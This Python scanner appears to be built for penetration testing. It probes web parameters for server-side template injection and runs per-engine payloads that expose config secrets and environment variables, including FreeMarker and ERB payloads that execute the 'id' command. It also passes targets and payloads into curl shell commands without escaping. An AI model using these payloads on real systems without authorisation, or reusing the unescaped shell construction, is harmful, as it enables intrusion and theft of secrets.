"""SSTI (Server-Side Template Injection) detection and exploitation tool."""
from __future__ import annotations
from typing import Any
from utils import run_cmd

# Engine fingerprinting decision tree
SSTI_PROBES: list[dict[str, Any]] = [
    {"payload": "{{7*7}}", "expected": "49", "engines": ["jinja2", "twig", "nunjucks", "handlebars"]},
    {"payload": "${7*7}", "expected": "49", "engines": ["freemarker", "velocity", "thymeleaf", "el"]},
    {"payload": "<%=7*7%>", "expected": "49", "engines": ["erb", "ejs", "slim"]},
    {"payload": "#{7*7}", "expected": "49", "engines": ["ruby", "pug", "jade"]},
    {"payload": "{7*7}", "expected": "49", "engines": ["smarty", "mako"]},
    {"payload": "{{7*'7'}}", "expected": "7777777", "engines": ["jinja2"]},
    {"payload": "{{7*'7'}}", "expected": "49", "engines": ["twig"]},
]

# RCE payloads per engine (safe detection versions)
SSTI_RCE: dict[str, list[dict[str, str]]] = {
    "jinja2": [
        {"payload": "{{config.items()}}", "detection": "SECRET_KEY or config values in response"},
        {"payload": "{{request.environ}}", "detection": "WSGI environment variables"},
        {"payload": "{{''.__class__.__mro__[1].__subclasses__()}}", "detection": "Python class list"},
    ],
    "twig": [
        {"payload": "{{_self.env.getExtension('Twig\\Extension\\CoreExtension')}}", "detection": "Twig extension object"},
    ],
    "freemarker": [
        {"payload": "${.version}", "detection": "FreeMarker version string"},
        {"payload": "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", "detection": "Command output"},
    ],
    "erb": [
        {"payload": "<%=`id`%>", "detection": "uid= in response"},
    ],
    "ejs": [
        {"payload": "<%- global.process.version %>", "detection": "Node.js version string"},
    ],
}

def scan_ssti(target: str, param: str = "q") -> dict[str, Any]:
    """Test for SSTI and fingerprint the template engine."""
    url = target if target.startswith("http") else f"https://{target}"
    sep = "&" if "?" in url else "?"
    findings = []
    detected_engine = ""
    # Phase 1: Detection
    for probe in SSTI_PROBES:
        encoded = probe["payload"].replace("{", "%7B").replace("}", "%7D").replace("<", "%3C").replace(">", "%3E").replace("=", "%3D").replace("#", "%23")
        test_url = f"{url}{sep}{param}={encoded}"
        try:
            result = run_cmd(f"curl -s '{test_url}' --max-time 10")
            if probe["expected"] in result:
                findings.append(f"SSTI DETECTED: {probe['payload']} -> {probe['expected']} (engines: {probe['engines']})")
                if not detected_engine and probe["engines"]:
                    detected_engine = probe["engines"][0]
        except Exception:
            pass
    # Phase 2: Engine fingerprinting + safe RCE proof
    if detected_engine and detected_engine in SSTI_RCE:
        for rce_probe in SSTI_RCE[detected_engine]:
            payload = rce_probe["payload"]
            encoded = payload.replace("{", "%7B").replace("}", "%7D").replace("<", "%3C").replace(">", "%3E").replace("=", "%3D").replace("#", "%23").replace("'", "%27")
            test_url = f"{url}{sep}{param}={encoded}"
            try:
                result = run_cmd(f"curl -s '{test_url}' --max-time 10")
                if any(indicator in result.lower() for indicator in ["secret", "config", "uid=", "version", "class"]):
                    findings.append(f"SSTI RCE ({detected_engine}): {rce_probe['detection']}")
            except Exception:
                pass
    output = "\n".join(findings) if findings else "No SSTI detected"
    return {"stdout": output, "returncode": 0 if findings else 1, "engine": detected_engine}
